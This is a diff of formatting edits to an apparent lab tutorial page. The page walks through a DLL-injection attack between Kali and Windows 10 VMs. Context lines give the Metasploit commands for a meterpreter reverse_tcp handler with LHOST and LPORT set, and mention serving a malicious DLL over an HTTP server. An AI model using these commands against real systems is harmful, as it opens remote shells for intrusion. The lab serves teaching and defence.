@@ -638,7 +638,7 @@ Finally! The time has come to give it our best shot...
 
 {{< figure src="/img/attack_kip.gif" title="" class="custom-figure" >}}
 
-**First, let's put all the pieces into place.**
+# 2.3.1. Getting the IPs 
 1. Fire up both your Windows 10 and Kali VMs.
 2. On our Kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155** NOTE: Yours will be different!
 
@@ -694,7 +694,7 @@ python3 -m http.server 8008
 - Ok, we now have our malicious DLL on the victim's disk. 
 
 6. So as we shared in the theory section of this course, this initial stager does one thing (at least on main thing): it calls back to the attacking machine to establish a connection and put in motion the subsequent series of events. But we can't run it just yet since we need something on our attacking machine that is actually listening and awaiting that call, ie the handler. So let's head over to our Kali VM.
-    - Now, let's run these commands:
+    - **Now, let's run these commands:**
         - `msfconsole`: this will open our metasploit console. 
         - ` use exploit/multi/handler`: this sets up a generic payload handler inside the Metasploit framework. The `multi` in the command denotes that this is a handler that can be used with any exploit module, as it is not specific to any particular exploit or target system. The `handler` part of the command tells Metasploit to wait for incoming connections from payloads. Once the exploit is executed on the target system, the payload will create a connection back to the handler which is waiting for the incoming connection.
         - `set payload windows/meterpreter/reverse_tcp`:  tells Metasploit what payload to use in conjunction with the previously selected exploit. The payload is the code that will be executed on the target system after a successful exploit. `windows`: This tells the framework that the target system is running Windows. `meterpreter`: Meterpreter is a sophisticated payload that provides an environment for controlling, manipulating, and navigating the target machine. `reverse_tcp`: This creates a reverse TCP connection from the target system back to the attacker's system. When the payload is executed on the target system, it will initiate a TCP connection back to the attacker’s machine (where Metasploit is running).
@@ -705,21 +705,21 @@ python3 -m http.server 8008
 
 {{< figure src="/img/image044.png" title="" class="custom-figure" >}}
 
-We can see there are 3 required parameters. The first one `EXITFUNC` is good as is. Meaning we need only to provide values for `LHOST` and `LPORT`, which is the exact same value we provided when we generated our `msfvenom` stager in step 2 - ie the attacker IP, as well as the port we chose (**88**).
+- We can see there are 3 required parameters. The first one `EXITFUNC` is good as is. Meaning we need only to provide values for `LHOST` and `LPORT`, which is the exact same value we provided when we generated our `msfvenom` stager in step 2 - ie the attacker IP, as well as the port we chose (**88**).
 
 8. We can now set these values with two commands:
-- `set LHOST 192.168.230.155` (Note: change IP to YOURS)
-- `set LPORT 88` 
+    - `set LHOST 192.168.230.155` (Note: change IP to YOURS)
+    - `set LPORT 88` 
 
-{{< figure src="/img/image045.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image045.png" title="" class="custom-figure-3" >}}
 
 9. Now to start the listener we can use one of two commands, there's literally no difference. You can either use `run`, or `exploit`. 
 
-{{< figure src="/img/image046.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image046.png" title="" class="custom-figure-3" >}}
 
-So now that we have our handler listening for a callback we can go back to our Windows VM to run the code. 
+- So now that we have our handler listening for a callback we can go back to our Windows VM to run the code. 
 
-**Performing the standard DLL-injection**
+**Preparing Our Injection Script**
 
 Next we need to perform a bit of Macgyvering...
 
